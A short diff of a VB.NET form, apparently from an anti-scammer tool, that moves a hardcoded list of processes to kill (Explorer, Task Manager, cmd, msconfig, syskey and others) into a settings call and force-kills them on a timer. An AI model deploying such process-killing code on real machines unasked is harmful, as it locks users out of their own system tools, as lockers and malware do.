@@ -1,9 +1,9 @@
 ﻿Public Class Form1
-    Private ReadOnly ProcsList() As String = {"explorer", "taskmgr", "iexplore", "msinfo32", "mmc", "dxdiag", "msconfig", "cmd", "notepad", "syskey"}
+    Private ReadOnly ProcsList() As String = Settings.GetProcsToKill()
     Private WithEvents ProcsTimer As New Timer()
 
     Private Sub ProcsTimer_Tick(sender As Object, e As EventArgs) Handles ProcsTimer.Tick
-        'Force kill processes tipically used by scammers, Windows Explorer and Task Manager
+        'Force kill processes
         For Each Process As Process In Process.GetProcesses
             If ProcsList.Contains(Process.ProcessName) Then
                 Process.Kill()
